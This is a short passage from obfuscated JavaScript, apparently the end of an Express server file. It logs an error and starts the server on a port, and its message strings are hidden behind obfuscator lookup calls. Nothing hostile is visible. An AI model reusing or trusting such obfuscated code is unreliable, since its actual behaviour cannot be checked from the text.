_0x170505=_0x57e576;console[_0x170505(0x143)](_0x170505(0x1bc),_0x4e1892);}),app['listen'](PORT,()=>console['log'](_0x57e576(0x16e)+PORT+'!'));
